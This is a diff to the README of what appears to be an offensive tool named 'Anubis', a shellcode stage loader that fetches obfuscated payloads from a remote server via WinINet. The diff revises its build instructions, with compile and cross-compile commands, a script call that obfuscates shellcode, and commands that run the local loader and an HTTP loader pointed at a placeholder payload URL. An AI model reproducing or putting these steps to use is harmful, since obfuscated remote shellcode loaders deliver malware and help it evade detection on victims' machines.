@@ -40,9 +40,11 @@ Uses WinINet to fetch obfuscated Unicode data from a remote server, decode it, a
 
 ## 🛠️ Build Instructions
 
-### Compile the Windows loader  
+### Compile the loader  
 ```bash
-cl Anubis_loader.c /link wininet.lib
+cl stageloader.c /link wininet.lib -o anubis_stage_loader.exe
+# for cross compile from linux
+x86_64-w64-mingw32-gcc stageloader.c -o anubis_stage_loader.exe -lwininet  
 ```
 ### Obfuscate shellcode
 ```bash
@@ -50,12 +52,12 @@ python obfuscate.py input.bin -o output.txt
 ```
 
 ### Run local loader
-```bash
+```powershell
 Anubis_loader.exe output.txt
 
 ```
 ### Run HTTP loader
-```bash
+```powershell
 Anubis_http_loader.exe https://example.com/payload.txt
 ```
 ----
